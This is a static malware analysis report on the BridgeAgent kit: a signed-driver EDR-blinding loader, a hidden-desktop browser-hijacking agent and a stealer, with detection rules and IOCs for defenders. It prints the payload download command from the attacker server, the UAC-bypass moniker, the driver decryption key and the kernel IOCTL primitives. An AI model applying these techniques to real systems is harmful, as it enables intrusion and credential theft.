# BridgeAgent: a signed AMD driver blinds the EDR, then a Rust agent hijacks the victim's own browser

| | |
|---|---|
| **Subtitle** | Static analysis of the BridgeAgent kit from MalwareBazaar: a BYOVD loader that abuses AMD PDFWKRNL.sys, the container it downloads, the "Bridge Agent" remote-access tool with a hidden-desktop browser takeover, and a companion stealer. Detections and IOCs. |
| **SHA-256** | Loader `acb4fdd8eab403dd309015ff8d73334ce7fb1656a627ae837804e59a1b20005a` (MD5 `52922ceeab0a95443710310269e0bd6b`). Container `d2b5f4ff9ccf98b4ebff54c8bf85e242bcf2b6387c10c451fe8c21d73c5d24fc`. Agent `c4545d48db19349484d97681beaa8832f25663250db0e5ff16ef36e9e8ea8766`. Collector `4d1b19e3df6c28728ef181c01aea11d5d2777a95a66c84771860daac9c51856b`. Driver `6e8b49cf70bf854e8c59c7d27cefa89406caf8978461190dabb86dafcd8554e1`. |
| **Family** | BridgeAgent (MalwareBazaar and Triage name, taken from the agent's own name "Bridge Agent"). The loader belongs to the family Ontinue calls LunexLoader (see *Prior art*). |
| **First seen** | MalwareBazaar: loader 2026-10-07 16:02 UTC (`Loader.exe`, reporter `wok`), agent 16:08 UTC the same day (`staonchik.exe`), container 2026-10-09. |
| **Files** | Loader: PE32+ GUI x64, 5,506,403 bytes, lld build, version info "Adobe Inc. / Windows Update Service / helper.exe". Agent: Rust x64, 7,530,496 bytes, "bridge-agent-v5.1.4", PDB `IT_solutions.pdb`, built 2026-10-06. Collector: Rust x64, 3,208,704 bytes, PDB `collector.pdb`, built 19 seconds after the agent. |
| **Analysis** | Static only. Ghidra 12.1.4 headless (loader), objdump (all files), capa 9.4.0 and FLOSS 3.1.1 (loader), YARA-X 1.21.0, Python. Nothing was executed or emulated. The container was fetched once by the analyst through a proxy from the loader's URL on 2026-10-16; no other network indicator was contacted. |
| **Date** | 2026-10-16 |

## Key findings

1. **The loader brings its own kernel driver.** A genuine, Microsoft-signed AMD
   "USB-C Power Delivery Firmware Update Utility Driver" (PDFWKRNL.sys, listed in
   LOLDrivers) sits inside the loader's .rdata as 16 chunks of AES-256-GCM
   ciphertext. The loader decrypts it, checks the GCM tag, writes it under a
   random name and loads it as a kernel service (`FUN_1400029e3`).
2. **Two IOCTLs give full kernel read and write.** The driver's handlers for
   0x80002014 and 0x80002028 call `memmove` with three fields of the caller's
   buffer and only check that the buffer is 0x30 bytes long (driver VAs
   0x140001299, 0x1400012c0). This is CVE-2023-20598.
3. **It removes four kinds of EDR hooks.** With kernel offsets from the
   ntoskrnl PDB (downloaded with curl.exe posing as the Microsoft symbol
   client), it zeroes process, thread and image-load notify routines that
   belong to 20 drivers (Defender, Kaspersky, Dr.Web, ESET, Elastic, Sysmon,
   CrowdStrike, SentinelOne, fltMgr). For object callbacks on processes and
   threads, and for registry callbacks, it empties the whole list whenever one
   entry belongs to a listed driver, so products not on the list lose theirs
   too.
4. **Defender is kept alive but disarmed.** The loader strips Protection,
   SignatureLevel and SectionSignatureLevel from MsMpEng.exe and copies
   explorer.exe's token into it. Earlier, over WMI, it excludes AppData,
   LocalAppData, Temp, `C:\Windows\Temp`, `C:\Users\Public` and the extensions
   `.exe .sys .dll .ps1 .bat .cmd`. When not elevated it first tries the
   CMSTPLUA UAC bypass behind a PEB masquerade as explorer.exe.
5. **The payload URL is hard-coded and replaceable.** The default is
   `hxxp://107.175.82[.]242:9000/wilow/staonchik.bin`; `-u` replaces it.
   `-t`, `-s`, `--no-load`, `--no-token` and `--no-elevate` change the target
   process, token source and steps. `--no-suspend` is parsed and ignored.
6. **The download is a two-program container.** `staonchik.bin` ends in the
   loader's `0xd1d2` trailer. It holds the Bridge Agent (written as
   `bridge.exe`) and a one-shot stealer (the leading bytes). Both are Rust,
   built by the same account 19 seconds apart, and both report to
   93.152.213[.]149, a different host from the download server.
7. **The agent's main feature is browser takeover on a hidden desktop.** It
   creates a private desktop `BridgeBackstage-<id>`, closes the victim's
   browser (with `taskkill /F` as a last resort), and reopens the victim's real
   Chrome, Edge, Brave, Opera, Yandex or Firefox profile there for the
   operator to drive. The same works for Telegram, Signal, Discord, Slack,
   Outlook and nine desktop wallets. No cookie needs to leave the machine.
8. **The collector takes everything else in five minutes.** 35 collectors run
   in parallel (browsers through an embedded ChromElevator build, wallets,
   password managers, messengers, Vault, Wi-Fi, VPN, SSH, cloud keys, an LSASS
   dump through an import-less `lss.exe`), and two ZIP uploads go to
   `/api/forensics` at 90 seconds and at 5 minutes.
9. **Detections:** 10 YARA rules (3 for the loader, 3 for the agent, 4 for the
   collector and its two helpers), each 1/1 on its sample and 0 hits on about
   47,000 benign files and the other lab samples. KQL, EQL and ES|QL for the
   loader chain, the agent and the collector are written from static analysis
   and not tested on telemetry.

## For defenders

| | |
|---|---|
| Fastest signal | `curl.exe` with `-A Microsoft-Symbol-Server/10.1700.661.0` fetching from `msdl.microsoft[.]com/download/symbols/`. Real symbol tools do not run curl. It comes before the driver load, while the EDR still reports. |
| Driver | Block PDFWKRNL.sys by hash (`6e8b49cf...`) with the Microsoft vulnerable driver blocklist or WDAC. It loads from `C:\Users\Public\`, `C:\Windows\Temp\` or `%TEMP%` under a random 8-12 character name. |
| If the loader ran | Assume the EDR is blind on that host from the driver load on. Check Defender exclusions (`Get-MpPreference`) for the five paths and six extensions above and remove them. Reboot to restore the kernel callbacks, and confirm MsMpEng.exe is a protected process again. |
| Agent on disk | `%LOCALAPPDATA%\Programs\Bridge\BridgeAgent.exe`, HKCU Run value `BridgeAgent` ending in `--supervisor`, state in `%LOCALAPPDATA%\Bridge\` (`agent.db`, `root-ca.crt`, `logs\bridge-agent.log`). Older installs: `Startup\Dropbox.exe`, `Startup\Bridge Agent.cmd`, `C:\ProgramData\BridgeAgent\`. |
| Network | 93.152.213[.]149:443 (agent C2 and collector upload), 107.175.82[.]242:9000 (download), `ip-api[.]com` country lookup from a non-browser just before the upload. |
| Accounts | Treat every browser session, messenger, wallet and saved credential on the host as taken. The agent uses live sessions in place, so password resets alone are not enough: revoke sessions and tokens. |

## Chain overview

```
Loader.exe (acb4fdd8)
  ├─ argv: -t MsMpEng.exe -s explorer.exe -u <url> --no-load --no-token --no-elevate
  ├─ not elevated: PEB masquerade as %WINDIR%\explorer.exe, CMSTPLUA elevation moniker
  ├─ elevated: Defender exclusions over WMI (MSFT_MpPreference)
  ├─ decrypt PDFWKRNL.sys (AES-256-GCM), random .sys name, CreateServiceA, StartServiceA
  ├─ curl.exe -A Microsoft-Symbol-Server/... -> ntoskrnl PDB -> offsets
  ├─ kernel writes via \\.\PdFwKrnl:
  │    notify routines, object callbacks, registry callbacks, MsMpEng PPL and token
  ├─ stop and delete the driver service
  └─ curl.exe -o "C:\Users\Public\<random>" "hxxp://107.175.82[.]242:9000/wilow/staonchik.bin"
       └─ 0xd1d2 container
            ├─ bridge.exe  = Bridge Agent (c4545d48)  -> %LOCALAPPDATA%\Programs\Bridge\BridgeAgent.exe
            │                 HKCU Run, HTTPS + WSS to 93.152.213[.]149:443
            └─ leading part = collector (4d1b19e3)    -> /api/forensics on 93.152.213[.]149
                              rxinjhelper.exe (ChromElevator), lss.exe (LSASS dump)
```

## Loader: file layout and string protection (observed)

The loader is a 200 KB lld-built stub followed by a 5.3 MB overlay. The overlay
is a 1x1 PNG, 56 KB of zeros and about 5.2 MB of printable filler with short
repeating runs. It carries no code or data that the stub reads. Inferred: it
inflates the file past scanner and sandbox size limits. The PE timestamp
(0xa4a414ea, a date in 2057) is a reproducible-build hash.

All sensitive strings are AES-256-CTR encrypted with one key (0x140017388) and
initial counter (0x1400173a8), reset for every string, through three copies of
the decoder (`FUN_1400056d3`, `FUN_14000ae64`, `FUN_140009ca4`).
`tools/bridgeagent_strings.py` decodes 109 strings statically, with exact
lengths taken from the decoder call sites in the Ghidra export
(`evidence/decrypted_strings.tsv`). About 40 Windows APIs are resolved by
name at run time, including the service control functions, DeviceIoControl,
K32EnumDeviceDrivers and the dbghelp `Sym*` functions.

FLOSS recovered none of these strings (only short emulation noise). capa
reports AES constants, runtime linking, PE parsing and VMware anti-VM strings.
The VMware strings were not traced to a code path.

## Loader: command line (observed)

`FUN_140001000` parses argv and fills a structure for `FUN_1400029e3`:

| Option | Default | Effect | Evidence |
|---|---|---|---|
| `-t <name>` | `MsMpEng.exe` | process stripped of protection and re-tokened | 0x140001a7a |
| `-s <name>` | `explorer.exe` | process whose token is copied into the `-t` process | 0x140001ad8 |
| `-u <url>` | `hxxp://107.175.82[.]242:9000/wilow/staonchik.bin` | payload URL | 0x140001c44 |
| `--no-load` | load on | no driver, no kernel work | 0x140001bab |
| `--no-token` | token copy on | skip the token copy | 0x140001b6c |
| `--no-elevate` | elevation on | skip the elevation check and UAC bypass | 0x140001bea, tested 0x140001ccb |
| `--no-suspend` | n/a | parsed, then ignored (0x140001b33 jumps back to the loop) | dead in this build |
| `-h` | n/a | help/exit | 0x140001c84 |

A third kernel step, copying the System token into the loader itself, is
compiled in (0x14000502f..0x140005062) but its flag is hard-coded to 0 at
0x140002256. `NtSuspendProcess` and `SeDebugPrivilege` are decoded but were
not tied to live code; inferred to belong to the removed suspend option.

## Loader: elevation and Defender (observed)

- **Elevation check:** OpenProcessToken(TOKEN_QUERY), GetTokenInformation(TokenElevation) at 0x140001ce8..0x140001d28.
- **Not elevated:** the loader rewrites its PEB `ImagePathName`,
  `CommandLine` and loader-entry names to `%WINDIR%\explorer.exe`, then calls
  `CoGetObject("Elevation:Administrator!new:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}")`
  with CLSCTX_LOCAL_SERVER. That CLSID is CMSTPLUA, an auto-elevating COM
  object. Inferred: it relaunches itself elevated through it. The method call
  was not traced.
- **Elevated:** WMI `root\Microsoft\Windows\Defender`, `MSFT_MpPreference`
  Add with `ExclusionPath` = %APPDATA%, %LOCALAPPDATA%, %TEMP%,
  `C:\Windows\Temp`, `C:\Users\Public` and `ExclusionExtension` = `.exe`,
  `.sys`, `.dll`, `.ps1`, `.bat`, `.cmd` (plain list at 0x14002d7d8).
  Inferred: `.sys` protects the dropped driver and the rest cover the payload.

## Loader: the embedded driver (observed)

The ciphertext is 0x13a98 bytes in 16 chunks listed at 0x14002d5f0, laid out
contiguously from 0x140019b58. The GCM parameters are all in the binary:

| | Value | Location |
|---|---|---|
| Key | `5e5ff683f73ec82254f5c5ef628275ea75aa8fbfadb1b67fcf9c38a6f5cbc970` | 0x14002d70c |
| H input | 16 zero bytes | 0x14002d72c |
| Nonce | `b4de7d0652fee824f58ce342`, counter 1 | immediates in `FUN_1400029e3` |
| AAD | empty | |
| Tag | `925ef442854dc9bd47629a316c2f73af` | 0x14002d6f0 |

Decrypting with these values verifies the tag. The result is 80,536 bytes:
AMD PDFWKRNL.sys, FileVersion 1.0, built 2022-12-22, Authenticode chain to
Microsoft Windows Hardware Compatibility Publisher, devices
`\Device\PdFwKrnl` and `\DosDevices\PdFwKrnl`.

The loader then:

1. picks a random service name (6 to 12 characters of `a-z0-9`) and file name
   (8 to 12 characters plus `.sys`) with an LCG, and a folder from
   `%WINDIR%\Temp\`, `%TEMP%` and `C:\Users\Public\`;
2. writes the driver, enables SeLoadDriverPrivilege, and calls
   CreateServiceA (or OpenServiceA if the name exists) and StartServiceA;
3. opens `\\.\PdFwKrnl`;
4. after the kernel work, closes the handle, stops the service and deletes it
   (from 0x140002cb9).

## Loader: kernel primitives (observed in both files)

| IOCTL | Loader wrapper | Driver handler | Operation |
|---|---|---|---|
| 0x80002028 | `FUN_140007dd5`, read 8 bytes | 0x1400012c0 | `memmove(buf+0x20, buf+0x10, buf+0x28)`: copy from the kernel address at +0x10 into the user buffer at +0x20 |
| 0x80002014 | `FUN_140007ce2` write 8 bytes, `FUN_140007ec6` write one zero byte | 0x140001299 | `memmove(buf+0x10, buf+0x18, buf+0x28)`: copy from the user buffer at +0x18 to the kernel address at +0x10 |

The driver dispatches on `IoControlCode - 0x80002000` (0 to 0x2c) through a
byte index at RVA 0x1428 and a jump table at RVA 0x13f4. The two handlers
check the input length (0x30) and nothing else.

## Loader: finding the kernel structures (observed)

- Kernel and driver base addresses: K32EnumDeviceDrivers and K32GetDeviceDriverBaseNameA.
- Symbols: `%SystemRoot%\System32\ntoskrnl.exe` is loaded with dbghelp, and its
  PDB is fetched by `curl.exe -s -L --connect-timeout 10 --max-time 120 --retry 1
  -A Microsoft-Symbol-Server/10.1700.661.0 -o "<path>"` from
  `hxxps://msdl.microsoft[.]com/download/symbols/`.
- Resolved names: `PspCreateProcessNotifyRoutine`, `PspCreateThreadNotifyRoutine`,
  `PspLoadImageNotifyRoutine`, `CallbackListHead`, `PsProcessType`,
  `PsThreadType`, `PsInitialSystemProcess`, `_OBJECT_TYPE.CallbackList` and
  the `_EPROCESS` fields `UniqueProcessId`, `ActiveProcessLinks`, `Token`,
  `SignatureLevel`, `SectionSignatureLevel`, `Protection` (globals
  0x1400341e0..0x140034248).

## Loader: blinding the EDR (observed)

The target list has 20 entries at 0x140019770, compared case-insensitively:

| Vendor | Drivers |
|---|---|
| Microsoft Defender | WdFilter.sys, MsSecFlt.sys |
| Kaspersky | klif.sys, klflt.sys, klam.sys, klark.sys, kneps.sys, klhk.sys |
| Dr.Web | dwprot.sys, drwebmon.sys, SpIDer.sys |
| ESET | eamonm.sys, ekbdflt.sys, epfwwfp.sys |
| Elastic | elastic-endpoint-driver.sys |
| Sysmon | SysmonDrv.sys |
| CrowdStrike | CrowdStrike.sys, csagent.sys |
| SentinelOne | SentinelMonitor.sys |
| Windows | fltMgr.sys |

| Hook | Routine | What it writes |
|---|---|---|
| Process, thread, image-load notify routines | `FUN_140007c3c` | walks 64 slots, masks the EX_CALLBACK low bits, reads the routine at +8, maps it to its driver and writes 0 into the slot if the driver is listed |
| Object callbacks (PsProcessType, PsThreadType) | `FUN_140007a64` | walks `CallbackList`, checks entry +0x28; if any entry is from a listed driver, sets the head's Flink and Blink to the head, which unhooks every entry |
| Registry callbacks (`CallbackListHead`) | inlined in `FUN_1400029e3` | the same walk and head reset |
| MsMpEng.exe (`-t`) | `FUN_140007f48`, `FUN_140007e5d` | zeroes Protection, SignatureLevel and SectionSignatureLevel (0x140004faf..0x140004fcd), then writes the `-s` process's Token into it (0x14000500b..0x14000501d) |

`ActiveProcessLinks` is only read, to find an EPROCESS by PID. None of the
kernel writes touch it, so the loader does not hide processes.

Inferred: with the default arguments, MsMpEng.exe keeps running, unprotected,
with explorer.exe's medium-integrity token. It can no longer open most
processes or protect itself, and the kernel callbacks that feed it are gone.

## Loader: download and launch (observed)

`FUN_1400029e3` runs `curl.exe -s -L --connect-timeout 10 --max-time 120 -o
"<path>" "<url>"` hidden (CREATE_NO_WINDOW), reads the file whole (ReadFile at
0x1400030b0) and deletes it. If the last four bytes are `d2 d1 00 00`, it reads
the name length (u16 at end-0xc) and payload size (u32 at end-0xa), writes the
payload under the embedded name (fallback `payload.exe`), and writes the
leading bytes as a second file with `FUN_140006af4`. Otherwise an `MZ` file is
started with `cmd.exe /c start "" "<path>"` and a `.msi` with
`msiexec.exe /i "<path>" /qn /norestart`.

## The container (observed)

The file served from the loader URL on 2026-10-16 is 10,739,222 bytes
(`d2b5f4ff...`, also on MalwareBazaar since 2026-10-09). Its trailer is
`... "bridge.exe" | 0x0003 | size 7,530,496 | name length 10 | d2 d1 00 00`.
`tools/bridgeagent_container.py` splits it:

| Part | SHA-256 | Size | What |
|---|---|---|---|
| leading bytes | `4d1b19e3df6c28728ef181c01aea11d5d2777a95a66c84771860daac9c51856b` | 3,208,704 | collector (`collector.pdb`) |
| `bridge.exe` | `c4545d48db19349484d97681beaa8832f25663250db0e5ff16ef36e9e8ea8766` | 7,530,496 | Bridge Agent, byte-identical to MalwareBazaar's `staonchik.exe` |

The u16 value 3 before the size is not read by this loader. The name and
launch path the loader uses for the collector part were not traced.

## Bridge Agent (observed)

**Build.** Rust (rustc commit 8bab26f4...), a single first-party `src\main.rs`
built under `C:\Users\Admin\`, 38 crates including tokio, tokio-tungstenite,
reqwest over SChannel, ring (Ed25519), rusqlite and jpeg-encoder. The build
string is `bridge-agent-v5.1.4-chromium-unified+c456d75d...`, built
2026-10-06T11:21:13Z. It has no anti-analysis: strings, endpoints and logs are
plaintext. The design and log style imitate a commercial RMM product, and the
PDB is named `IT_solutions.pdb`.

**C2.** State lives in SQLite `agent.db` (`configuration(key,value)`). If no
`server_ip` is stored, the agent writes the default, built from two
overlapping 8-byte immediates (`"93.152.2"`, `".213.149"`), the only hidden
value in the binary: 93.152.213[.]149, port 443.

| Endpoint | Use |
|---|---|
| `https://<server>/api/agent/enroll` | enrollment: token, installation id, name, owner, country, OS, version, Ed25519 public key, capabilities |
| `https://<server>/api/agent/sync?wait_seconds=` | long-poll fallback |
| `wss://<server>/api/agent/connect` | main session: jobs, remote sessions, liveness |
| `wss://<server>/api/agent/media` | JPEG screen frames |
| `https://<server>/api/agent/transfers/<id>` | resumable file transfer |
| `https://<server>/api/agent/ca-recovery` | signed replacement of the pinned CA |

Requests carry `X-Device-ID`, `X-Timestamp`, `X-Nonce` and `X-Signature`
(Ed25519 over timestamp and nonce; key protected with DPAPI). The server
answers with `X-Bridge-Server-Time` and `X-Bridge-Auth-Error`. TLS is pinned
to a private CA stored as `root-ca.crt`. No User-Agent string is set.

**Jobs** (22 types, dispatcher 0x1400ef74b..0x1400effc7): `file.list`,
`file.stat`, `file.drives`, `file.mkdir`, `file.rename`, `file.move`,
`file.copy`, `file.delete`, `file.hash`, `file.download`,
`file.upload.commit`, `command.execute` (cmd or PowerShell),
`script.execute`, `software.install`, `software.deploy`, `install.msi`,
`managed.apply`, `managed.stop`, `managed.repair`, `managed.remove`,
`inventory.collect`, `agent.restart`. Remote sessions offer a ConPTY shell
and screen modes `standard`, `backstage` and `private-window`, with input
replayed through SendInput.

**Backstage.** The agent creates `BridgeBackstage-<id>` with CreateDesktopW
and starts applications on it suspended and inside a Job Object. For a
browser it passes the victim's real `--user-data-dir` and
`--profile-directory`. A profile in use is freed in steps: ask, close windows,
kill the verified process tree, and finally `taskkill /F` by image name in the
user's session. Restart Manager and the profile lock files confirm it is
free. The catalogue also covers explorer, notepad, Telegram, classic Outlook,
Slack, Discord, Signal and the wallets Exodus, Ledger Live, Trezor Suite,
Electrum, Sparrow, Atomic Wallet, Guarda, Monero GUI and Bitcoin Core. For
Store apps that cannot be bound to the private desktop, it can show the user
a WTSSendMessageW prompt titled `Bridge access request` that claims an
authorized administrator wants one-time access.

Inferred: this is hidden-VNC style session hijacking. The operator works
inside the victim's live sessions on the victim's machine, so Chrome's
App-Bound Encryption is irrelevant to the agent. The visible side effect is
the user's browser closing.

**Surveillance ("forensics" collectors).** Clipboard text, the text of the
focused control through UI Automation, process starts and stops, foreground
windows, USB arrival and removal, and logon, lock and RDP session events,
batched as `forensics.events`. Fields that look like passwords, card codes,
OTPs, API keys or private keys are redacted before sending. Inferred: chat,
mail and search text is still captured, so with text capture on this is a
field-level keylogger.

**Install and persistence.** The agent copies itself to
`%LOCALAPPDATA%\Programs\Bridge\BridgeAgent.exe`, keeps state in
`%LOCALAPPDATA%\Bridge\`, and persists with `reg.exe ADD
HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v BridgeAgent ...
"--supervisor"`. A supervisor and a runtime process watch each other's
heartbeat files (`--supervisor`, `--supervisor-pid`, `--adopt-runtime`), with
mutexes prefixed `Local\BridgeAgent-`. The same routine removes
`Startup\Dropbox.exe` and `Startup\Bridge Agent.cmd` and migrates
`C:\ProgramData\BridgeAgent\agent.db`. Inferred: those were the install
locations of earlier versions. The agent needs no elevation and never reads
the loader's container trailer.

## Collector (observed from strings and targeted disassembly)

- **Server:** the plaintext `93.152.213[.]149` (0x14026aaba) with
  `/api/forensics` over HTTPS. Headers `X-Device-ID`, `X-Signature`,
  `X-Country`, `X-Public-IP`; the country comes from
  `hxxp://ip-api[.]com/json/?fields=countryCode`.
- **Timing:** a partial ZIP at 90 seconds and a complete ZIP at 5 minutes
  (`DUAL TRANSMISSION STRATEGY`), work in a temporary folder that is deleted
  afterwards.
- **Collectors (35):** Chrome, Edge, Brave, Opera, Vivaldi, Yandex and Firefox
  data; browser wallet extensions; LastPass, 1Password, Bitwarden, KeePass;
  Telegram, Signal, Discord, Slack; Thunderbird; Windows Vault; `Default.rdp`;
  `.ssh`, `.netrc`, `.gitconfig`; `.azure`, `.gcp`, `.aws`, gcloud; OneDrive,
  OneNote, Desktop, Downloads, `.env`; OpenVPN, WireGuard, NordVPN; Wi-Fi
  profiles; TeamViewer, AnyDesk; Steam; groups, processes, software,
  environment. `[SEEDS]`, `[2FA]` and `[SCREENSHOT]` are stubs in this build.
  `[LATERAL]` is named but its sources were not found.
- **rxinjhelper.exe** (`95b6cbcf...`, embedded at 0x14010a5c2): strings of
  ChromElevator, a public tool that hollows the browser with direct syscalls
  and asks its elevation service for the App-Bound key. It runs for up to 90
  seconds and returns keys, cookies and passwords over a named pipe.
- **lss.exe** (`7e7df0e3...`, embedded at 0x1402660a0, 16,896 bytes): no
  import table, contains `MDMP`; the collector expects `lss.dmp`. Inferred:
  an LSASS minidump writer that needs the admin rights the loader's UAC bypass
  provides.

Inferred: the collector does bulk theft once at install time, and the agent
keeps hands-on access afterwards. Both point at one server.

## ATT&CK

| Technique | Evidence | Status |
|---|---|---|
| T1068 Exploitation for Privilege Escalation | PDFWKRNL.sys IOCTLs 0x80002014/0x80002028 (CVE-2023-20598) | observed |
| T1543.003 Windows Service | random kernel driver service, created then deleted | observed |
| T1562.001 Disable or Modify Tools | callback removal, MsMpEng PPL strip and token swap, Defender exclusions | observed |
| T1548.002 Bypass User Account Control | CMSTPLUA elevation moniker | observed |
| T1036.005 Masquerading | PEB as explorer.exe; version info "Windows Update Service"; agent cover as IT tooling | observed |
| T1027 / T1027.009 Obfuscated Files, Embedded Payloads | AES-CTR strings, AES-GCM driver, junk overlay | observed |
| T1105 Ingress Tool Transfer | curl.exe download; agent `file.download`, `software.install` | observed |
| T1547.001 Registry Run Keys | HKCU Run `BridgeAgent` | observed |
| T1564.003 Hidden Window (hidden desktop) | `BridgeBackstage-<id>` | observed |
| T1539 / T1185 Steal Web Session Cookie, Browser Session Hijacking | Backstage profile reuse; collector cookies through ChromElevator | observed |
| T1056.001 Keylogging / T1115 Clipboard Data | UI Automation text capture, clipboard listener | observed |
| T1003.001 LSASS Memory | `lss.exe`, `lss.dmp` | observed (strings) |
| T1555 Credentials from Password Stores | browsers, Vault, password managers | observed (strings) |
| T1071.001 / T1573 Web Protocols, Encrypted Channel | HTTPS and WSS on 443, pinned CA | observed |
| T1041 Exfiltration Over C2 Channel | `/api/forensics` ZIP uploads | observed (strings) |
| T1059.001 / T1059.003 PowerShell, Windows Command Shell | `command.execute`, `script.execute`, ConPTY shell | observed |

## Detections

| File or rule | Type | What it detects | Validation |
|---|---|---|---|
| `detections/yara/bridgeagent_loader.yar`, `BridgeAgent_Loader_Key_Material` | YARA | the string key and counter, the GCM key and tag | 1/1 loader |
| same file, `BridgeAgent_Loader_Code` | YARA | the two IOCTL wrappers and the GCM nonce immediates | 1/1 loader |
| same file, `Hunt_PdFwKrnl_IOCTL_Client_x64` | YARA (hunting) | any x64 user-mode PE that sends both PdFwKrnl IOCTLs | 1/1 loader, 0 on the driver |
| `detections/yara/bridgeagent_backdoor.yar`, `BridgeAgent_Backdoor_Strings`, `_Code`, `_DefaultC2_93_152_213_149` | YARA | agent protocol, logging and persistence strings; job-type immediates; the stack-built C2 | 1/1 agent each |
| benign corpus | n/a | `~/.local/opt`, system Python library, `/usr/bin`, other lab samples | 0 hits (loader rules on 47,103 files; agent rules on 47,106 files) |
| `detections/kql/bridgeagent_2026-10_iocs.kql` | Defender XDR | hashes of all five files, driver loads by hash, the download server, symsrv-spoofing curl | not tested on telemetry |
| `detections/kql/bridgeagent_byovd_pdfwkrnl.kql` | Defender XDR | six chain steps per device in 30 minutes: symbol download, Defender exclusions, driver service in a user folder, driver load, download, hidden launch | not tested on telemetry |
| `detections/kql/bridgeagent_backdoor.kql` | Defender XDR | Run value, canonical path and switches, state files, C2, browser and shell children of BridgeAgent.exe | not tested on telemetry |
| `detections/elastic/bridgeagent_byovd_chain.eql` | Elastic EQL | symsrv curl, then driver from a user folder, then curl into `C:\Users\Public`; plus the curl step alone | not tested on telemetry |
| `detections/elastic/bridgeagent_2026-10_iocs.esql` | ES\|QL | hashes, driver, download server, symsrv curl | not tested on telemetry |
| `detections/elastic/bridgeagent_backdoor.eql`, `.esql` | Elastic | Run key by reg.exe, supervisor and runtime processes, children, C2 | not tested on telemetry |
| `detections/yara/bridgeagent_collector.yar`, `BridgeAgent_Collector_Strings`, `_Collector_Server_93_152_213_149` | YARA | collector log, upload and helper strings; the upload server next to `/api/forensics` and the ip-api lookup | 1/1 collector each; also match the container, which begins with the collector |
| same file, `BridgeAgent_RxInjHelper_ChromElevator` | YARA | the standalone rxinjhelper.exe: ChromElevator banner and usage, App-Bound key strings, pipe signal, Chromium-like pipe names, two-DLL import table | 1/1 rxinjhelper.exe; other ChromElevator builds will also match |
| same file, `BridgeAgent_Lss_LsassDumper` | YARA | the standalone lss.exe: no imports, ntdll API hash table as instruction immediates, djb2 loop, `\??\`/`lss.`/`.dmp` immediates | 1/1 lss.exe |
| benign corpus, collector file | n/a | `~/.local/opt`, system Python library, `/usr/bin`, the other 243 files in samples/ | 0 hits on 46,864 files outside samples/ and on the other lab samples (`evidence/yara_validation_collector.txt` in the agent report folder) |
| `detections/kql/bridgeagent_collector.kql` | Defender XDR | rxinjhelper.exe or lss.exe from a temp folder with an unsigned parent, browser started by rxinjhelper.exe, lsass opened or read by lss.exe, `lss.dmp` and `octo-fingerprint.json`, three or more collector output files in one folder, ip-api.com lookup then a connection to the server from the same process | not tested on telemetry |
| `detections/elastic/bridgeagent_collector.eql`, `.esql` | Elastic | the same signals; EQL as five queries (unsigned parent to helper sequence, lsass API access, files, browser child, geo lookup then upload), ES\|QL as a per-process score | not tested on telemetry |

Gap: the collector, rxinjhelper.exe and lss.exe now have YARA, KQL and Elastic rules, but the hunting queries have not been run on real telemetry, and the KQL and Elastic queries rely on the default file names (`rxinjhelper.exe`, `lss.exe`, `lss.dmp`), which a rebuild can change. The YARA code rule for lss.exe is the part most likely to survive a rename.

The step most worth alerting on is the symbol download. It happens before the
driver loads, so the EDR still reports it, and curl.exe has no legitimate
reason to claim to be the Microsoft symbol client.

## IOCs

```
sha256  acb4fdd8eab403dd309015ff8d73334ce7fb1656a627ae837804e59a1b20005a  loader Loader.exe (MD5 52922ceeab0a95443710310269e0bd6b, SHA-1 ae3623103310c8bc62efcb8538800efeffee931f)
sha256  6e8b49cf70bf854e8c59c7d27cefa89406caf8978461190dabb86dafcd8554e1  PDFWKRNL.sys, legitimate signed AMD driver, vulnerable (MD5 b96d75a000367c200958089728fc5cb8)
sha256  d2b5f4ff9ccf98b4ebff54c8bf85e242bcf2b6387c10c451fe8c21d73c5d24fc  staonchik.bin container (0xd1d2 trailer)
sha256  c4545d48db19349484d97681beaa8832f25663250db0e5ff16ef36e9e8ea8766  Bridge Agent (bridge.exe / staonchik.exe / BridgeAgent.exe), imphash 2797ccba8cc94a31426670b81b0c4915
sha256  4d1b19e3df6c28728ef181c01aea11d5d2777a95a66c84771860daac9c51856b  collector (collector.pdb)
sha256  95b6cbcfa3d138ba741f735e46ffcefe670bed5e3bb8d0a3f66842271a1caf0e  rxinjhelper.exe (ChromElevator build) embedded in the collector
sha256  7e7df0e30b6aba8637fb58db0a2e7a876890b872f0d0b313424d46c9299580e8  lss.exe (LSASS dumper) embedded in the collector
sha256  06f434695f93d7fd11eeff71358ff69fed79d310a66d993bbcc4ff979c117c90  psychedeliclove.exe, Lunex stealer from the same download server (MalwareBazaar, not analysed here)
```

Network (only the loader URL was fetched, once, by the analyst through a proxy):

```
download  hxxp://107.175.82[.]242:9000/wilow/staonchik.bin
          hxxp://107.175.82[.]242:9000/wilow/psychedeliclove.exe   (ThreatFox, 2026-09-29)
c2        93.152.213[.]149:443  hxxps:// /api/agent/enroll, /sync, /transfers/, /ca-recovery, /api/forensics
                                wss[:]// /api/agent/connect, /api/agent/media
headers   X-Device-ID, X-Timestamp, X-Nonce, X-Signature, X-Country, X-Public-IP; replies X-Bridge-Server-Time, X-Bridge-Auth-Error
geo       hxxp://ip-api[.]com/json/?fields=countryCode  (collector, legitimate service)
symbols   hxxps://msdl.microsoft[.]com/download/symbols/  with curl.exe -A Microsoft-Symbol-Server/10.1700.661.0  (legitimate host)
```

Host:

```
device    \\.\PdFwKrnl; driver service and .sys file with random a-z0-9 names in C:\Users\Public\, C:\Windows\Temp\, %TEMP%
defender  ExclusionPath %APPDATA% %LOCALAPPDATA% %TEMP% C:\Windows\Temp C:\Users\Public
          ExclusionExtension .exe .sys .dll .ps1 .bat .cmd
uac       Elevation:Administrator!new:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}
file      %LOCALAPPDATA%\Programs\Bridge\BridgeAgent.exe
          %LOCALAPPDATA%\Bridge\agent.db, root-ca.crt, logs\bridge-agent.log, .heartbeat.json, runtime.lifecycle.json
          legacy: C:\ProgramData\BridgeAgent\agent.db, Startup\Dropbox.exe, Startup\Bridge Agent.cmd
          collector: lss.dmp, octo-fingerprint.json, wifi_networks.txt, installed_browsers.txt in a temporary folder
registry  HKCU\Software\Microsoft\Windows\CurrentVersion\Run  BridgeAgent = "<path>\BridgeAgent.exe" --supervisor
mutex     Local\BridgeAgent-<role>
desktop   BridgeBackstage-<id>
cmdline   BridgeAgent.exe --supervisor | --supervisor-pid <pid> | --adopt-runtime
